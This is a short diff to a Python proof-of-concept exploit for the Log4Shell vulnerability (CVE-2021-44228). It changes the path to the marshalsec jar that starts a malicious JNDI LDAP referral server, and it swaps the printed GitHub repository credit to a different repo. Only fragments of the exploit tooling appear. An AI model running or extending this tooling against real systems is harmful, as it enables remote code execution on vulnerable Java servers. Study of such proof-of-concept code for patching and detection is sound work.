@@ -98,7 +98,7 @@ def ldap_server(userip: str, lport: int) -> None:
     subprocess.run([
         os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/java"),
         "-cp",
-        os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
+        os.path.join(CUR_FOLDER, "marshalsec-0.0.3-SNAPSHOT-all.jar"),
         "marshalsec.jndi.LDAPRefServer",
         url,
     ])
@@ -108,7 +108,7 @@ def main() -> None:
     init(autoreset=True)
     print(Fore.BLUE + """
 [!] CVE: CVE-2021-44228
-[!] Github repo: https://github.com/kozmer/log4j-shell-poc
+[!] Github repo: https://github.com/Hack-with-8k0b/log4j-poc/
 """)
 
     parser = argparse.ArgumentParser(description='log4shell PoC')
